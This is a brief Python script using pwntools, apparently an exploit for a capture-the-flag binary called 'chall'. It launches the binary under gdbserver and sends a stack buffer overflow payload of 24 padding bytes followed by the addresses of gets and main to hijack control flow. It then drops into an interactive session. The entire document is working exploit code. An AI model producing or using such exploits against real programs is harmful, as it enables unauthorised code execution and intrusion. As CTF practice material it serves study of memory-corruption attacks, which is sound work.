from pwn import *

elf = ELF('./chall')
io = process(['gdbserver', 'localhost:1234', './chall'])
#io = process(elf.path)
context.binary = elf

payload = b'a' * 24
payload += p64(elf.symbols['gets'])
payload += p64(elf.symbols['main'])

io.sendline(payload)

io.interactive()
